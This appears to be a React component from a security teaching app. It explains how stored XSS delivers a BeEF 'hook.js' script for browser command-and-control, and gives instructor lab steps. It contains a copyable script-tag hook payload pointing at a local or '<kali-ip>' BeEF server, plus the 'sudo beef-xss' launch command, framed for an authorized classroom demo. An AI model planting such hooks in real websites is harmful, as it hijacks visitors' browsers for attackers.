import React, { useState } from 'react';
import { 
  Terminal, 
  Crosshair, 
  Radio, 
  ShieldAlert, 
  ShieldCheck, 
  Cpu, 
  ExternalLink, 
  Copy, 
  Check, 
  Lock,
  ArrowRight,
  Monitor
} from 'lucide-react';

export function BeefDemonstration() {
  const [beefStatus, setBeefStatus] = useState('Standby'); // 'Standby', 'Listening', 'Hooked'
  const [copiedCmd, setCopiedCmd] = useState(null);

  const hookPayload = `<script src="http://127.0.0.1:3000/hook.js"></script>`;

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedCmd(id);
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  return (
    <div className="cyber-card" style={{ borderColor: 'var(--border-accent)' }}>
      <div className="card-header">
        <div className="card-title-group">
          <div className="card-icon red">
            <Crosshair size={18} />
          </div>
          <div>
            <h2 className="card-title">Kali Linux BeEF (Browser Exploitation Framework) Integration</h2>
            <p className="card-desc">
              Understand how attackers leverage Stored XSS as a carrier payload to achieve persistent browser hooking and Command & Control (C2).
            </p>
          </div>
        </div>

        {/* Manual Instructor Status Indicator */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span style={{ fontSize: '11.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>
            DEMO STATUS:
          </span>
          <div style={{ display: 'flex', gap: '4px' }}>
            {['Standby', 'Listening', 'Hooked'].map((status) => (
              <button
                key={status}
                type="button"
                className={`payload-chip ${beefStatus === status ? 'legit' : ''}`}
                style={{ 
                  padding: '3px 10px', 
                  fontSize: '11px',
                  background: beefStatus === status 
                    ? status === 'Hooked' ? 'rgba(239, 68, 68, 0.2)' : 'rgba(0, 229, 255, 0.2)' 
                    : 'transparent',
                  color: beefStatus === status
                    ? status === 'Hooked' ? '#ff6b6b' : 'var(--accent-cyan)'
                    : 'var(--text-dim)',
                  borderColor: beefStatus === status ? 'currentColor' : 'var(--border-subtle)'
                }}
                onClick={() => setBeefStatus(status)}
              >
                {status}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Conceptual Explanations */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '20px' }}>
        <div style={{
          background: 'var(--bg-panel)',
          padding: '16px',
          borderRadius: 'var(--radius-md)',
          border: '1px solid var(--border-subtle)'
        }}>
          <h3 style={{ fontSize: '14px', color: 'var(--text-main)', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <Radio size={15} style={{ color: 'var(--accent-cyan)' }} />
            What is BeEF & Browser Hooking?
          </h3>
          <p style={{ fontSize: '12.5px', color: 'var(--text-muted)', lineHeight: '1.6' }}>
            <strong>BeEF</strong> (Browser Exploitation Framework) is an offensive security tool installed on Kali Linux. <strong>Browser Hooking</strong> occurs when a browser executes BeEF's JavaScript payload (<code>hook.js</code>). Once hooked, the browser opens an asynchronous communication channel back to the attacker's BeEF server.
          </p>
        </div>

        <div style={{
          background: 'var(--bg-panel)',
          padding: '16px',
          borderRadius: 'var(--radius-md)',
          border: '1px solid var(--border-subtle)'
        }}>
          <h3 style={{ fontSize: '14px', color: 'var(--text-main)', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <ShieldAlert size={15} style={{ color: 'var(--accent-red)' }} />
            How Stored XSS Enables BeEF
          </h3>
          <p style={{ fontSize: '12.5px', color: 'var(--text-muted)', lineHeight: '1.6' }}>
            Stored XSS is the delivery vehicle for BeEF. An attacker submits <code>&lt;script src="http://&lt;kali-ip&gt;:3000/hook.js"&gt;&lt;/script&gt;</code> into a comment field. Every victim who loads the forum automatically executes the script, instantly hooking their browser into the attacker's BeEF C2 panel.
          </p>
        </div>
      </div>

      {/* Architecture & Relationship Diagram */}
      <div style={{ marginBottom: '20px' }}>
        <div style={{ fontSize: '12px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', marginBottom: '8px' }}>
          RELATIONSHIP ARCHITECTURE: STORED XSS ➔ PERSISTENCE ➔ BROWSER HOOK
        </div>

        <div className="beef-diagram">
          {/* Node 1: Attacker Kali */}
          <div className="beef-node kali-attacker">
            <Terminal size={22} style={{ color: 'var(--accent-red)', margin: '0 auto 8px' }} />
            <div style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-main)' }}>Attacker Terminal</div>
            <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', marginTop: '2px' }}>
              Kali Linux (BeEF C2)
            </div>
            <div style={{ fontSize: '10.5px', color: '#fca5a5', marginTop: '6px' }}>
              Injects hook.js payload
            </div>
          </div>

          <div style={{ color: 'var(--border-accent)', display: 'flex', alignItems: 'center' }}>
            <ArrowRight size={20} />
          </div>

          {/* Node 2: Vulnerable Application & MySQL */}
          <div className="beef-node vuln-server">
            <Cpu size={22} style={{ color: 'var(--accent-cyan)', margin: '0 auto 8px' }} />
            <div style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-main)' }}>Vulnerable Web App</div>
            <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', marginTop: '2px' }}>
              Express + MySQL
            </div>
            <div style={{ fontSize: '10.5px', color: 'var(--accent-cyan)', marginTop: '6px' }}>
              Stores hook payload in DB
            </div>
          </div>

          <div style={{ color: 'var(--border-accent)', display: 'flex', alignItems: 'center' }}>
            <ArrowRight size={20} />
          </div>

          {/* Node 3: Victim Browser */}
          <div className="beef-node hooked-victim">
            <Monitor size={22} style={{ color: 'var(--accent-purple)', margin: '0 auto 8px' }} />
            <div style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-main)' }}>Victim Browser</div>
            <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', marginTop: '2px' }}>
              Authorized Test Browser
            </div>
            <div style={{ fontSize: '10.5px', color: 'var(--accent-purple)', marginTop: '6px' }}>
              Executes hook.js & beacons
            </div>
          </div>
        </div>
      </div>

      {/* Instructor-Only Classroom Demonstration Instructions */}
      <div style={{
        background: 'var(--bg-panel)',
        borderRadius: 'var(--radius-md)',
        border: '1px solid var(--border-subtle)',
        padding: '18px'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
          <Lock size={15} style={{ color: 'var(--accent-green)' }} />
          <h3 style={{ fontSize: '13.5px', fontWeight: 700, color: 'var(--text-main)' }}>
            Instructor-Only Guide: Conducting a Safe BeEF Demonstration in Kali Linux
          </h3>
        </div>

        <ol style={{ 
          fontSize: '12.5px', 
          color: 'var(--text-muted)', 
          lineHeight: '1.8', 
          paddingLeft: '20px',
          display: 'flex',
          flexDirection: 'column',
          gap: '8px'
        }}>
          <li>
            <strong>Start BeEF on Kali Linux:</strong> Open a Kali terminal and execute <code>sudo beef-xss</code>. Note the administrative credentials displayed on startup.
          </li>
          <li>
            <strong>Access the Control Panel:</strong> Navigate to <code>http://127.0.0.1:3000/ui/panel</code> in your instructor browser.
          </li>
          <li>
            <strong>Authorized Test Hook Payload:</strong> In the Stored XSS Lab comment feed above, submit the following payload using an isolated authorized test browser:
            <div style={{ 
              marginTop: '6px',
              display: 'flex', 
              alignItems: 'center', 
              gap: '8px',
              background: 'var(--bg-terminal)',
              padding: '6px 12px',
              borderRadius: 'var(--radius-sm)',
              border: '1px solid var(--border-subtle)'
            }}>
              <code style={{ fontSize: '12px', color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>
                {hookPayload}
              </code>
              <button
                type="button"
                className="icon-btn"
                style={{ width: '24px', height: '24px', marginLeft: 'auto' }}
                onClick={() => copyToClipboard(hookPayload, 'hook')}
                title="Copy hook payload"
              >
                {copiedCmd === 'hook' ? <Check size={12} style={{ color: 'var(--accent-green)' }} /> : <Copy size={12} />}
              </button>
            </div>
          </li>
          <li>
            <strong>Verify Hooking in BeEF:</strong> In the BeEF UI, the test browser will appear under "Hooked Browsers". Demonstrate module enumeration (e.g. Browser Fingerprinting, Notification Bar simulation) on the authorized test browser.
          </li>
        </ol>

        {/* Safety Boundary Notice */}
        <div style={{
          marginTop: '14px',
          padding: '10px 14px',
          borderRadius: 'var(--radius-sm)',
          background: 'rgba(239, 68, 68, 0.08)',
          border: '1px solid var(--border-danger)',
          fontSize: '11.5px',
          color: '#fca5a5',
          display: 'flex',
          alignItems: 'center',
          gap: '8px'
        }}>
          <ShieldAlert size={16} style={{ flexShrink: 0, color: 'var(--accent-red)' }} />
          <span>
            <strong>Safety Mandate:</strong> The BeEF demonstration is strictly restricted to an authorized local test browser owned and controlled by the instructor. No automatic hooking of student personal devices or public network exposure is permitted.
          </span>
        </div>
      </div>
    </div>
  );
}

